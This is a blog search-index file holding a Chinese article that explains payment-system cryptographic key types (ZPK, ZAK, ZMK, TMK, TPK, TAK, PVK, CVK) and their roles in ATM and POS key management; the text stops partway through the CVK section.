<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>密钥类型介绍</title>
      <link href="/archives/1b745eac.html"/>
      <url>/archives/1b745eac.html</url>
      
        <content type="html"><![CDATA[<h1 id="ZPK（Zone-Pin-Key）"><a href="#ZPK（Zone-Pin-Key）" class="headerlink" title="ZPK（Zone Pin Key）"></a>ZPK（Zone Pin Key）</h1><p><strong>ZPK</strong>（<strong>Zone Pin Key</strong>)是一种专门用于金融交易中加密 PIN 码的密钥类型，特别是在 ATM 和 POS 终端的交易过程中使用。ZPK 是金融支付系统中特定领域的密钥，用于保护在不同区域（Zone）之间传输的敏感数据（如 PIN 和其他交易信息），确保这些数据在传输过程中不会被窃取或篡改。</p><h2 id="ZPK-的用途："><a href="#ZPK-的用途：" class="headerlink" title="ZPK 的用途："></a>ZPK 的用途：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.加密和解密 PIN：ZPK 主要用于加密和解密用户输入的 PIN 码，确保在终端和银行主机之间传输的 PIN 是安全的。</span><br><span class="line"></span><br><span class="line">2.区域间密钥交换：ZPK 通常用于在不同加密区（如银行网络和支付处理器网络）之间传输数据时对 PIN 进行加密。不同的加密区使用不同的 ZPK 来保证区域间的安全通信。</span><br><span class="line"></span><br><span class="line">3.金融网络中的数据保护：ZPK 是金融网络中常用的密钥类型之一，能够保护交易过程中使用的敏感信息不被暴露或被恶意攻击者利用。</span><br></pre></td></tr></table></figure><h2 id="ZPK-典型使用场景："><a href="#ZPK-典型使用场景：" class="headerlink" title="ZPK 典型使用场景："></a>ZPK 典型使用场景：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">● ATM 交易：在用户输入 PIN 码后，ATM 终端会使用 ZPK 对 PIN 进行加密，并将加密后的 PIN 发送给银行的验证系统。</span><br><span class="line"></span><br><span class="line">● POS 终端交易：在商家 POS 终端中，用户输入 PIN 码后，POS 设备使用 ZPK 加密 PIN，并通过支付处理网络将加密的 PIN 传输到银行的主机进行验证。</span><br></pre></td></tr></table></figure><h2 id="ZPK-的安全机制："><a href="#ZPK-的安全机制：" class="headerlink" title="ZPK 的安全机制："></a>ZPK 的安全机制：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">● 对称加密：ZPK 通常使用对称加密算法（如 DES 或 3DES）来对 PIN 码进行加密和解密。由于对称加密算法需要使用相同的密钥进行加密和解密，ZPK 需要在发送和接收双方之间共享。</span><br><span class="line"></span><br><span class="line">● 密钥管理系统：ZPK 的生成、分发和管理都通过严格的密钥管理系统（如 HSM，硬件安全模块）进行，以确保 ZPK 本身的安全性。</span><br></pre></td></tr></table></figure><h2 id="ZPK-与其他密钥类型的区别："><a href="#ZPK-与其他密钥类型的区别：" class="headerlink" title="ZPK 与其他密钥类型的区别："></a>ZPK 与其他密钥类型的区别：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">● TPK（Terminal Pin Key）：TPK 是终端密钥，用于在 ATM 或 POS 终端中加密 PIN。TPK 和 ZPK 类似，但 ZPK 用于跨区域的 PIN 传输，而 TPK 主要在终端设备中使用。</span><br><span class="line">● MK（Master Key）：ZPK 是在主密钥（Master Key）下生成的子密钥。Master Key 通常用于保护 ZPK 等密钥的传输和存储。</span><br></pre></td></tr></table></figure><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>ZPK 是一种重要的金融交易密钥，用于加密在 ATM 和 POS 终端中输入的 PIN 码，并确保这些敏感信息在不同区域之间传输时的安全性。</p><h1 id="ZAK（Zone-Authentication-Key）"><a href="#ZAK（Zone-Authentication-Key）" class="headerlink" title="ZAK（Zone Authentication Key）"></a>ZAK（Zone Authentication Key）</h1><p><strong>ZAK</strong>（<strong>Zone Authentication Key</strong>）是一种用于金融交易和支付系统中的密钥类型，主要用于认证不同区域之间的数据传输和通信的合法性和安全性。它通常用于确保敏感数据（如卡片信息、交易数据）在不同加密区域（Zone）之间进行安全的认证传输。</p><h2 id="ZAK-的用途："><a href="#ZAK-的用途：" class="headerlink" title="ZAK 的用途："></a>ZAK 的用途：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.区域间认证：ZAK 主要用于在不同安全区域之间传递数据时，确保数据的完整性和真实性。它通过加密认证来验证数据的来源和接收方，确保传输过程中的数据不会被篡改或伪造。</span><br><span class="line"></span><br><span class="line">2.加密和解密认证信息：ZAK 常用于加密区域（如支付处理网络、银行系统）之间交换认证信息，以验证交易的合法性。</span><br><span class="line"></span><br><span class="line">3.保护敏感数据：ZAK 被用来保护在不同加密区域之间传输的敏感数据，确保这些数据在传输时不会被截取或修改。</span><br></pre></td></tr></table></figure><h2 id="ZAK-的工作原理："><a href="#ZAK-的工作原理：" class="headerlink" title="ZAK 的工作原理："></a>ZAK 的工作原理：</h2><p>ZAK 一般通过对称加密算法（如 DES、3DES）来加密和解密认证信息。它用于认证两端（发送方和接收方）之间的通信，验证消息是否来自可信任的源，并且未被篡改。</p><h2 id="ZAK-的典型使用场景："><a href="#ZAK-的典型使用场景：" class="headerlink" title="ZAK 的典型使用场景："></a>ZAK 的典型使用场景：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">● ATM 和 POS 终端中的认证：当一个区域（如 POS 终端或 ATM）与银行主机通信时，ZAK 用于认证这些设备之间的通信是否安全，并确保传输的交易数据或 PIN 码未被篡改。</span><br><span class="line"></span><br><span class="line">● 金融机构之间的认证：在银行、支付处理商、信用卡公司等不同的金融机构之间，ZAK 用于认证每一笔交易的合法性和真实性。</span><br></pre></td></tr></table></figure><h2 id="ZAK-与其他密钥类型的区别："><a href="#ZAK-与其他密钥类型的区别：" class="headerlink" title="ZAK 与其他密钥类型的区别："></a>ZAK 与其他密钥类型的区别：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">● ZPK（Zone Pin Key）：ZPK 专门用于加密和解密 PIN 码，而 ZAK 则用于认证区域间的通信数据，确保通信的完整性和合法性。</span><br><span class="line"></span><br><span class="line">● TPK（Terminal Pin Key）：TPK 主要用于终端设备（如 ATM 和 POS 终端）与服务器之间的 PIN 码加密，而 ZAK 更关注区域之间的数据认证。</span><br><span class="line">   </span><br><span class="line">● KEK（Key Encryption Key）：KEK 是用来加密其他密钥的密钥，而 ZAK 则直接用于认证数据和区域之间的通信。</span><br></pre></td></tr></table></figure><h2 id="总结：-1"><a href="#总结：-1" class="headerlink" title="总结："></a>总结：</h2><p>ZAK（Zone Authentication Key）是一种关键的认证密钥，广泛应用于金融系统中，确保不同区域之间的数据传输的安全性和真实性。通过加密和认证，ZAK 确保敏感交易数据在跨区域传输时不被篡改或伪造，从而保证整个支付系统的安全性。</p><h1 id="ZMK（Zone-Master-Key）"><a href="#ZMK（Zone-Master-Key）" class="headerlink" title="ZMK（Zone Master Key）"></a>ZMK（Zone Master Key）</h1><p><strong>ZMK</strong>（<strong>Zone Master Key</strong>）是一种在金融交易系统中常用的密钥类型，主要用于在不同区域（Zone）之间安全传输其他密钥，如加密 PIN 码的密钥（ZPK）和认证密钥（ZAK）。它是一种高等级的加密密钥，常用于密钥的分发和管理，确保密钥在不同区域或系统之间传递时的安全性。</p><h2 id="ZMK-的主要用途："><a href="#ZMK-的主要用途：" class="headerlink" title="ZMK 的主要用途："></a>ZMK 的主要用途：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 密钥的加密和传输：ZMK 的主要作用是保护其他密钥（如 ZPK、ZAK、TPK）在不同设备、系统或区域之间传输时的安全性。ZMK 本身不会直接加密交易数据，而是加密用于数据加密的工作密钥。</span><br><span class="line"></span><br><span class="line">2. 区域间密钥交换：ZMK 在金融交易网络的不同区域（如 ATM、POS 终端与银行服务器之间）中，用来加密和传输密钥。通过 ZMK 传输的密钥可以在区域之间安全交换，确保密钥不会在传输过程中被窃取或篡改。</span><br><span class="line"></span><br><span class="line">3. 密钥管理系统的一部分：ZMK 是密钥管理体系中至关重要的一环，用于建立安全的密钥分发和管理流程，通常配合硬件安全模块（HSM）来管理密钥的生成、存储和传输。</span><br></pre></td></tr></table></figure><h2 id="ZMK-的工作原理："><a href="#ZMK-的工作原理：" class="headerlink" title="ZMK 的工作原理："></a>ZMK 的工作原理：</h2><p>ZMK 通常使用对称加密算法（如 DES 或 3DES）来加密其他密钥。它的工作方式是，首先生成 ZMK，并在安全环境中（如 HSM）存储，然后在需要将其他密钥从一个区域传输到另一个区域时，使用 ZMK 对这些密钥进行加密。接收方使用相同的 ZMK 解密，从而安全获取密钥。</p><h2 id="ZMK-的典型使用场景："><a href="#ZMK-的典型使用场景：" class="headerlink" title="ZMK 的典型使用场景："></a>ZMK 的典型使用场景：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">● ATM 与银行主机之间的密钥传输：在 ATM 系统中，ZMK 用来在 ATM 终端和银行主机之间传输加密的工作密钥，如 ZPK、ZAK 等，确保 PIN 码和交易数据加密的安全性。</span><br><span class="line"></span><br><span class="line">● POS 终端中的密钥管理：在 POS 终端与支付网关之间，ZMK 被用来安全传输用于加密 PIN 的 ZPK，确保终端设备和银行系统之间的密钥管理安全。</span><br><span class="line"></span><br><span class="line">● 金融机构之间的密钥交换：在银行、信用卡公司和支付处理器等不同金融机构之间，ZMK 用于加密并安全传输各类工作密钥，确保交易系统的安全性和稳定性。</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">## ZMK 与其他密钥类型的区别：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>● ZPK（Zone Pin Key）：ZPK 是用于加密和解密 PIN 码的密钥，而 ZMK 则是用于加密和传输 ZPK 等工作密钥。</p><p>● KEK（Key Encryption Key）：KEK 也用于加密其他密钥，类似于 ZMK，但 ZMK 主要在区域之间使用，而 KEK 可能用于更多场景的密钥保护和传输。</p><p>● Master Key（主密钥）：ZMK 是一种主密钥类型，专门用于区域间的密钥交换和保护，而其他主密钥可以用于更广泛的加密场景。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## ZMK 的安全管理：</span><br><span class="line">由于 ZMK 是高度敏感的密钥，通常使用硬件安全模块（HSM）来生成、存储和管理 ZMK。在金融交易网络中，ZMK 的生成和分发必须遵循严格的安全标准，如 PCI-DSS（支付卡行业数据安全标准），以确保整个系统的密钥管理安全可靠。</span><br><span class="line">## 总结：</span><br><span class="line">ZMK（Zone Master Key）是用于加密和传输其他密钥的主密钥，确保在不同区域或系统之间传输的密钥安全可靠。它是金融交易系统中密钥管理的重要组成部分，广泛用于 ATM、POS 终端和银行主机之间的密钥交换和加密传输。</span><br><span class="line"></span><br><span class="line"># TMK（Terminal Master Key）</span><br><span class="line">TMK（Terminal Master Key）是金融交易系统中的一种密钥类型，主要用于管理终端设备（如 ATM、POS 终端）的主密钥。TMK 是终端加密体系中的关键元素，它为终端设备提供密钥管理和加密功能，确保交易数据的安全性。TMK 主要用于加密传输其他工作密钥，如 TPK（Terminal Pin Key）、TAK（Terminal Authentication Key），从而确保交易过程中敏感数据的加密传输安全。</span><br><span class="line">## TMK 的主要用途：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1.密钥管理：TMK 是终端设备的主密钥，用于加密和保护其他在终端中使用的工作密钥，如 TPK（用于加密 PIN 码）和 TAK（用于终端认证）。通过使用 TMK，终端设备可以安全地接收、存储和管理这些工作密钥。</p><p>2.密钥的加密和传输：TMK 在终端与银行主机或支付处理机构之间传输其他工作密钥时，充当加密密钥。它可以保护这些工作密钥的安全，防止密钥在传输过程中被截取或篡改。</p><p>3.终端安全认证：TMK 还可以用于认证终端设备，确保它与后台系统的通信是可信的。通过 TMK，终端可以生成和验证数字签名，从而防止未经授权的设备接入网络。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## TMK 的工作原理：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>● 对称加密：TMK 通常使用对称加密算法（如 DES、3DES）进行加密操作。它存储在 ATM 或 POS 终端中，用来加密和解密其他密钥，以确保交易数据在传输过程中保持加密状态。</p><p>● 密钥注入：在设备初次配置或重新配置时，TMK 会被安全地注入到终端设备中。密钥注入通常通过安全通道进行，确保 TMK 本身不会被窃取或泄露。</p><p>● 密钥分发和更新：TMK 的分发和更新通过严格的密钥管理系统完成。当需要更新 TMK 时，会使用安全通道来传输新的密钥，以确保设备的密钥安全性和完整性。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## TMK 的典型使用场景：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1.ATM 终端：在 ATM 终端中，TMK 用于保护其他用于交易的工作密钥，如加密 PIN 码的 TPK。ATM 通过 TMK 来接收并保护从银行主机发送的工作密钥，确保交易数据的安全传输。</p><p>2.POS 终端：在 POS 终端中，TMK 用于管理和保护用于加密交易数据的密钥。POS 设备在与银行或支付处理商通信时，TMK 用于确保传输密钥的安全性。</p><p>3.终端与支付网关之间的通信：当终端设备需要与支付网关或银行服务器进行安全通信时，TMK 可以加密终端的工作密钥，确保数据传输过程的安全。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## TMK 与其他密钥类型的区别：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>● TPK（Terminal Pin Key）：TPK 是用于加密用户输入的 PIN 码的工作密钥，而 TMK 是用于保护和传输 TPK 等工作密钥的主密钥。</p><p>● ZMK（Zone Master Key）：ZMK 主要用于在不同加密区域之间传输密钥，而 TMK 专门用于管理终端设备中的密钥，特别是在 ATM 和 POS 设备上。</p><p>● KEK（Key Encryption Key）：KEK 是一种加密密钥的密钥，类似于 TMK，但 KEK 的应用范围更广，而 TMK 特别用于终端设备。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## TMK 的安全管理：</span><br><span class="line">由于 TMK 是终端设备中非常关键的安全元素，其管理通常通过硬件安全模块（HSM）来进行，以确保密钥的生成、注入、存储和传输的安全。为了保护 TMK 不被泄露，金融机构通常使用双因素或多因素身份验证来确保密钥管理的安全性。TMK 还会定期更新，以防止长期使用的密钥被破解。</span><br><span class="line">## 总结：</span><br><span class="line">TMK（Terminal Master Key）是金融交易系统中的重要主密钥，用于管理和保护终端设备（如 ATM 和 POS 终端）中的其他工作密钥。它确保终端设备在交易过程中能够安全地传输和处理敏感信息，如用户的 PIN 码和交易数据。通过使用 TMK，可以确保终端设备与银行或支付处理机构之间的通信安全可靠。</span><br><span class="line"></span><br><span class="line"># TPK（Terminal Pin Key）</span><br><span class="line">TPK（Terminal Pin Key）是一种用于加密和解密用户在终端设备（如 ATM、POS 终端）输入的 PIN 码的密钥类型。TPK 是在金融交易系统中确保用户 PIN 码安全的重要元素，通过 TPK 加密，用户的 PIN 码可以在终端设备和银行主机之间的通信中得到保护，防止在传输过程中被窃取或篡改。</span><br><span class="line">## TPK 的主要用途：</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><p>PIN 码加密：TPK 的主要功能是对用户在 ATM 或 POS 终端中输入的 PIN 码进行加密，确保在设备与银行主机之间传输时 PIN 不被泄露。加密后的 PIN 码通常会与其他交易信息一起发送到银行服务器进行验证。</p></li><li><p>PIN 码解密：在银行主机或支付处理中心，接收到通过 TPK 加密的 PIN 码后，使用相应的 TPK 对 PIN 码进行解密，从而验证用户输入的 PIN 码是否正确。</p></li><li><p>安全传输：TPK 保障了终端设备与后台服务器之间的通信安全，特别是敏感的用户认证信息（如 PIN 码）的传输安全。TPK 加密后的 PIN 码即使在传输过程中被截获，攻击者也无法解密得到实际的 PIN 码。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## TPK 的工作原理：</span><br><span class="line">TPK 通常通过对称加密算法（如 DES、3DES）来加密和解密 PIN 码。以下是 TPK 的工作过程：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>● 加密过程：用户在 ATM 或 POS 终端输入 PIN 码后，终端使用 TPK 对 PIN 进行加密。加密后的 PIN 码会与其他交易信息（如卡号、交易金额等）一起发送到银行主机。</p></li></ol><p>● 解密过程：在银行主机或支付处理器接收到加密的 PIN 后，使用相同的 TPK 对加密的 PIN 码进行解密，获取用户输入的真实 PIN 码，然后与银行系统中存储的 PIN 进行比对验证。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## TPK 的典型使用场景：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1.ATM 交易：当用户在 ATM 终端输入 PIN 码进行取款、转账或余额查询时，ATM 终端会使用 TPK 对用户的 PIN 码进行加密，并将加密的 PIN 码发送到银行主机进行验证。</p><p>2.POS 终端交易：在 POS 终端中，用户输入 PIN 码进行支付时，POS 设备使用 TPK 对该 PIN 码进行加密，并通过支付网关将加密后的 PIN 码发送到银行服务器进行验证。</p><p>3.金融机构间的交易认证：在金融机构之间进行交易时，TPK 也用于加密和传输 PIN 码，确保交易认证的安全性和准确性。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## TPK 与其他密钥类型的区别：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>● TMK（Terminal Master Key）：TMK 是终端设备中的主密钥，用于加密和保护 TPK 等工作密钥。TMK 确保 TPK 在终端设备中安全存储和传输，而 TPK 主要用于加密 PIN 码。</p><p>● ZPK（Zone Pin Key）：ZPK 也是用于加密 PIN 的密钥，但 ZPK 主要用于跨区域的 PIN 传输，比如在不同金融机构或不同区域之间传输加密的 PIN，而 TPK 专门用于终端设备与银行主机之间的 PIN 码加密。</p><p>● KEK（Key Encryption Key）：KEK 用于加密其他密钥，而不是用于直接加密 PIN 码。TPK 是用于终端设备中 PIN 码的加密，而 KEK 则通常用于加密和传输 TPK 等工作密钥。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## TPK 的安全管理：</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><p>密钥注入：TPK 通常通过安全通道注入到 ATM 或 POS 终端中。这些密钥的注入过程必须在高度安全的环境下进行，通常由硬件安全模块（HSM）或经过加密的密钥管理系统完成。</p></li><li><p>密钥更新：TPK 需要定期更新，以防止因长期使用导致的密钥泄露或破解风险。密钥更新同样通过安全的加密通道进行。</p></li><li><p>防止篡改：TPK 的存储和使用在终端设备中受到严格保护，防止物理篡改或攻击。ATM 和 POS 终端通常采用防篡改设计，确保密钥在设备遭受攻击时不会泄露。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## 总结：</span><br><span class="line">TPK（Terminal Pin Key）是金融交易系统中用于加密和保护用户在终端设备输入的 PIN 码的重要密钥。通过 TPK 加密，用户的 PIN 码可以安全地在 ATM、POS 终端和银行主机之间传输，有效防止 PIN 码在通信过程中被窃取或篡改。TPK 是确保交易系统中用户身份认证安全的关键元素。</span><br><span class="line"></span><br><span class="line"># TAK（Terminal Authentication Key）</span><br><span class="line">TAK（Terminal Authentication Key）是用于金融交易系统中终端设备（如 ATM、POS 终端）的认证密钥。它的主要作用是确保终端设备和银行或支付处理系统之间的通信是可信和安全的。通过使用 TAK，可以验证终端设备的合法性，防止未经授权的设备接入交易系统，从而保障交易的安全性。</span><br><span class="line">## TAK 的主要用途：</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>终端设备认证：TAK 用于对终端设备进行身份验证，确保其是经过授权的合法设备。银行或支付系统通过 TAK 验证终端的合法性，确保只有被认证的设备能够进行交易。</p></li><li><p>防止设备欺诈：通过 TAK 验证，可以防止伪造的终端设备进入银行或支付网络。这有效降低了因非法设备引发的安全风险，如 PIN 窃取、伪造交易等。</p></li><li><p>通信数据的完整性和真实性：TAK 用于生成数字签名或消息认证码（MAC），确保终端设备与银行服务器之间的通信数据没有被篡改，并且数据的来源是可信的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## TAK 的工作原理：</span><br><span class="line"></span><br><span class="line">```   </span><br><span class="line">● 认证过程：在每笔交易或定期的设备认证过程中，终端设备使用 TAK 生成认证数据（如 MAC）。这些数据与其他交易信息一起发送到银行主机或支付系统，银行主机使用对应的 TAK 对认证数据进行验证，以确认该终端设备的合法性。</span><br><span class="line"></span><br><span class="line">● 加密和解密：TAK 通常使用对称加密算法（如 DES、3DES）进行加密和解密操作。终端设备和银行主机共享相同的 TAK，用于相互认证。</span><br><span class="line"></span><br><span class="line">● 消息认证码（MAC）生成：TAK 通常用于生成消息认证码（MAC），确保终端与银行系统之间的交易信息在传输过程中没有被篡改，并验证交易来源的合法性。 </span><br></pre></td></tr></table></figure></li></ol><h2 id="TAK-的典型使用场景："><a href="#TAK-的典型使用场景：" class="headerlink" title="TAK 的典型使用场景："></a>TAK 的典型使用场景：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ATM 终端认证：当 ATM 终端与银行主机建立连接时，ATM 终端通过 TAK 生成认证信息（如 MAC），发送到银行主机进行验证。银行主机使用相同的 TAK 验证该 ATM 是否是合法的，并确保其可以进行交易处理。</span><br><span class="line"></span><br><span class="line">2. POS 终端认证：POS 终端使用 TAK 来生成认证码，确保 POS 设备是经过认证的合法设备，并防止伪造的设备通过网络进行欺诈交易。</span><br><span class="line"></span><br><span class="line">3. 设备与支付处理系统的安全通信：TAK 确保终端设备与支付处理系统之间的数据通信是经过认证和加密的，防止未经授权的设备访问支付网络或银行系统。</span><br></pre></td></tr></table></figure><h2 id="TAK-与其他密钥类型的区别："><a href="#TAK-与其他密钥类型的区别：" class="headerlink" title="TAK 与其他密钥类型的区别："></a>TAK 与其他密钥类型的区别：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">● TPK（Terminal Pin Key）：TPK 主要用于加密用户的 PIN 码，而 TAK 则用于验证终端设备的合法性和通信的完整性。</span><br><span class="line"></span><br><span class="line">● TMK（Terminal Master Key）：TMK 是终端设备中的主密钥，用于加密和保护工作密钥（如 TPK、TAK），而 TAK 是专门用于终端设备认证的密钥。</span><br><span class="line"></span><br><span class="line">● ZAK（Zone Authentication Key）：ZAK 类似于 TAK，用于区域间的数据认证，但 TAK 主要用于终端设备的认证，而 ZAK 主要用于不同区域或系统间的数据传输认证。 </span><br></pre></td></tr></table></figure><h2 id="TAK-的安全管理："><a href="#TAK-的安全管理：" class="headerlink" title="TAK 的安全管理："></a>TAK 的安全管理：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 密钥注入：TAK 在终端设备中通常通过安全的密钥注入过程完成。该过程必须在高度安全的环境下进行，以防止密钥泄露。通常，密钥注入是在硬件安全模块（HSM）或其他加密设备的帮助下完成。</span><br><span class="line"></span><br><span class="line">2. 定期更新：为了防止 TAK 长时间使用导致潜在的安全风险，金融系统通常会定期更新 TAK，并通过安全通道进行新的密钥分发。</span><br><span class="line"></span><br><span class="line">3. 防篡改保护：终端设备中使用的 TAK 受到严格的物理和逻辑保护。设备通常具有防篡改功能，确保在设备受到物理攻击时，TAK 不会泄露。</span><br></pre></td></tr></table></figure><h2 id="TAK-的生成与管理："><a href="#TAK-的生成与管理：" class="headerlink" title="TAK 的生成与管理："></a>TAK 的生成与管理：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">● 硬件安全模块（HSM）：TAK 的生成、存储和管理通常由 HSM 进行。HSM 提供高度安全的加密环境，确保 TAK 在生成和存储过程中不会被泄露。</span><br><span class="line"></span><br><span class="line">● 密钥分发：TAK 的分发通常通过加密通道进行，确保密钥在传输过程中的安全性。银行或支付处理机构会将 TAK 安全地注入到终端设备中。 </span><br></pre></td></tr></table></figure><h2 id="总结：-2"><a href="#总结：-2" class="headerlink" title="总结："></a>总结：</h2><p>TAK（Terminal Authentication Key）是一种重要的密钥，用于认证终端设备（如 ATM、POS 终端）的合法性，并确保其与银行或支付处理系统之间的通信安全。通过 TAK，交易系统能够验证终端设备的身份，并保护通信数据的完整性和真实性，从而防止设备欺诈和数据篡改等风险。</p><h1 id="PVK（Private-Key，私钥）"><a href="#PVK（Private-Key，私钥）" class="headerlink" title="PVK（Private Key，私钥）"></a>PVK（Private Key，私钥）</h1><p>PVK（Private Key，私钥）是非对称加密体系中的一个核心概念，它与公钥（Public Key）成对使用。私钥通常用于解密由公钥加密的数据，或用于生成数字签名来验证数据的完整性和身份真实性。PVK 是保护敏感信息和执行安全通信的关键，它在许多应用场景中都扮演着重要角色，尤其是在加密、身份认证和数字签名等领域。</p><h2 id="PVK-的主要用途："><a href="#PVK-的主要用途：" class="headerlink" title="PVK 的主要用途："></a>PVK 的主要用途：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 解密：在非对称加密体系中，使用公钥加密的数据只能由对应的私钥解密。因此，PVK 常用于解密加密消息，以确保只有授权方能够读取这些信息。</span><br><span class="line"></span><br><span class="line">2. 数字签名：PVK 还可以用于生成数字签名，证明数据的来源和完整性。签名后的数据可以由公钥进行验证，确保数据没有被篡改且来自持有私钥的一方。</span><br><span class="line"></span><br><span class="line">3. 身份认证：在安全通信或登录系统中，PVK 被用于证明用户或设备的身份。通过数字签名或加密挑战应答，持有 PVK 的一方可以向系统证明其身份的合法性。</span><br><span class="line"></span><br><span class="line">4. 密钥交换：PVK 在密钥交换协议中也起到关键作用，例如在 TLS（传输层安全）协议中，私钥用于协商会话密钥，确保通信的机密性。</span><br></pre></td></tr></table></figure><h2 id="PVK-的工作原理："><a href="#PVK-的工作原理：" class="headerlink" title="PVK 的工作原理："></a>PVK 的工作原理：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 非对称加密：非对称加密使用一对密钥，公钥用于加密，私钥用于解密。PVK 是这对密钥中的私密部分，只有密钥持有者拥有。典型的非对称加密算法包括 RSA、ECC 等。</span><br><span class="line"></span><br><span class="line">2. 签名与验证：在数字签名过程中，PVK 用于对数据进行签名，生成的签名可由公钥验证。签名证明数据的来源，并确保在传输过程中未被篡改。</span><br></pre></td></tr></table></figure><h2 id="PVK-的典型使用场景："><a href="#PVK-的典型使用场景：" class="headerlink" title="PVK 的典型使用场景："></a>PVK 的典型使用场景：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. SSL/TLS 加密通信：在 HTTPS 通信中，服务器持有 PVK，用于解密客户端发送的加密数据，或者生成数字签名以证明服务器的身份。</span><br><span class="line"></span><br><span class="line">2. 加密电子邮件：在 PGP 或 S/MIME 等加密电子邮件系统中，收件人使用 PVK 解密加密的电子邮件内容，发件人使用 PVK 签署电子邮件以证明其来源。</span><br><span class="line"></span><br><span class="line">3. 区块链与加密货币：在区块链和加密货币系统（如比特币、以太坊）中，PVK 用于签署交易，证明交易的合法性，并确保只有私钥持有者可以发起资金转移。</span><br><span class="line"></span><br><span class="line">4. SSH 认证：在 SSH 连接中，用户通过 PVK 生成签名，服务器验证用户的身份，从而实现无密码的身份验证。</span><br></pre></td></tr></table></figure><h2 id="PVK-的安全管理："><a href="#PVK-的安全管理：" class="headerlink" title="PVK 的安全管理："></a>PVK 的安全管理：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 私钥的保护：由于 PVK 是高度敏感的密钥，它必须得到严格的保护。通常，私钥存储在受保护的硬件中，如硬件安全模块（HSM）或智能卡，以防止未经授权的访问。</span><br><span class="line"></span><br><span class="line">2. 备份和恢复：PVK 的丢失将导致加密数据无法解密或签名无法验证。因此，私钥通常需要安全备份，并在必要时可以进行恢复。</span><br><span class="line"></span><br><span class="line">3. 密钥分发：由于 PVK 只能由持有者掌控，不能像公钥一样公开，因此其分发过程必须通过安全通道进行，确保私钥在传输过程中不会被截获。</span><br><span class="line"></span><br><span class="line">4. 密钥更新与轮换：为了避免长期使用的私钥被破解或泄露，PVK 通常会定期更新或轮换。在更新 PVK 时，新的私钥必须与旧的公钥关联，以确保系统的连续性。</span><br></pre></td></tr></table></figure><h2 id="PVK-与其他密钥类型的区别："><a href="#PVK-与其他密钥类型的区别：" class="headerlink" title="PVK 与其他密钥类型的区别："></a>PVK 与其他密钥类型的区别：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">● 公钥（Public Key）：公钥是与 PVK 成对使用的密钥，通常公开用于加密数据或验证数字签名，而 PVK 负责解密和生成签名。</span><br><span class="line"></span><br><span class="line">● 对称密钥：对称密钥用于加密和解密同一密钥，PVK 仅在非对称加密体系中使用，在对称加密中不涉及私钥。</span><br><span class="line"> </span><br><span class="line">● TPK（Terminal Pin Key）、ZPK（Zone Pin Key）：这些密钥用于金融交易中的特定加密用途，如加密 PIN 码和传输数据，而 PVK 更广泛用于安全通信和身份认证。</span><br></pre></td></tr></table></figure><h2 id="总结：-3"><a href="#总结：-3" class="headerlink" title="总结："></a>总结：</h2><p>PVK（Private Key，私钥）是非对称加密体系中的关键密钥，用于解密数据、生成数字签名和验证身份。在各种安全通信、加密交易和身份认证系统中，PVK 是确保数据机密性和完整性的重要保障。由于其敏感性，PVK 需要在高度安全的环境中管理和存储，防止密钥泄露或被篡改。</p><h1 id="CVK（Card-Verification-Key，卡验证密钥）"><a href="#CVK（Card-Verification-Key，卡验证密钥）" class="headerlink" title="CVK（Card Verification Key，卡验证密钥）"></a>CVK（Card Verification Key，卡验证密钥）</h1><p>CVK（Card Verification Key，卡验证密钥）是一种用于金融系统中的密钥，专门用于生成和验证银行卡上的验证码（Card Verification Value, CVV），也称为卡验证码。CVK 是确保银行卡交易安全的重要组成部分，尤其是在非接触式或无卡支付交易中（如在线购物）。通过 CVK，发卡机构可以生成 CVV&#x2F;CVC 等卡验证值，确保卡片信息在交易中未被篡改。</p><h2 id="CVK-的主要用途："><a href="#CVK-的主要用途：" class="headerlink" title="CVK 